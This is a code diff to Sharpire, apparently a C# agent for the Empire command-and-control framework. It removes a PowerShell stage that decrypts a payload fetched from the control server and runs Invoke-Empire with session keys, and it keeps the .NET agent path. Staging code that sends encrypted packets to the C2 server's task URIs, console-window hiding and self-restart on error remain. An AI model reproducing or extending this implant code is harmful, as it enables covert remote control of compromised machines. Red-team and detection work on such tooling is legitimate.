@@ -157,26 +157,16 @@ namespace Sharpire
             try
             {
                 stage1response = Stage1();
-                stage2response = Stage2(stage1response);
+                Stage2(stage1response);
                 try
                 {
 #if (PRINT)
-                        Console.WriteLine("Launching Empire");
-                        IntPtr handle = Misc.GetConsoleWindow();
-                        Misc.ShowWindow(handle, Misc.SW_HIDE);
+                    Console.WriteLine("Launching Empire");
+                    IntPtr handle = Misc.GetConsoleWindow();
+                    Misc.ShowWindow(handle, Misc.SW_HIDE);
 #endif
-                    if (sessionInfo.GetAgentLanguage() == "powershell"
-                        || sessionInfo.GetAgentLanguage() == "ps"
-                        || sessionInfo.GetAgentLanguage() == "posh")
-                    {
-                        PowershellEmpire(stage2response);
-                    }
-                    else if (sessionInfo.GetAgentLanguage() == "dotnet"
-                             || sessionInfo.GetAgentLanguage() == "net"
-                             || sessionInfo.GetAgentLanguage() == "clr")
-                    {
-                        DotNetEmpire();
-                    }
+
+                    DotNetEmpire();
                 }
                 catch
                 {
@@ -336,7 +326,7 @@ namespace Sharpire
             return null;
         }
         
-        private byte[] Stage2(byte[] nonce)
+        private void Stage2(byte[] nonce)
         {
             byte[] keyBytes = sessionInfo.GetSessionKeyBytes();
             
@@ -351,28 +341,7 @@ namespace Sharpire
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentID(), 3, encryptedData);
 
             Random random = new Random();
-            return SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
-        }
-        
-        private void PowershellEmpire(byte[] stage2Response)
-        {
-            string empire = Encoding.ASCII.GetString(aesDecrypt(Encoding.ASCII.GetBytes(sessionInfo.GetSessionKey()), stage2Response));
-            string execution = "Invoke-Empire";
-            execution += " -Servers \"" + sessionInfo.GetControlServers().First() + "\"";
-            execution += " -StagingKey \"" + sessionInfo.GetStagingKey() + "\"";
-            execution += " -SessionKey \"" + sessionInfo.GetSessionKey() + "\"";
-            execution += " -SessionID  \"" + sessionInfo.GetAgentID() + "\"";
-            
-            using (Runspace runspace = RunspaceFactory.CreateRunspace())
-            {
-                runspace.Open();
-
-                using (Pipeline pipeline = runspace.CreatePipeline())
-                {
-                    pipeline.Commands.AddScript(empire + ";" + execution + ";");
-                    pipeline.Invoke();
-                }
-            }
+            SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
         }
         
         private void DotNetEmpire()
@@ -383,7 +352,7 @@ namespace Sharpire
             {
                 agent.Execute();
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 GC.Collect();
                 DotNetEmpire();
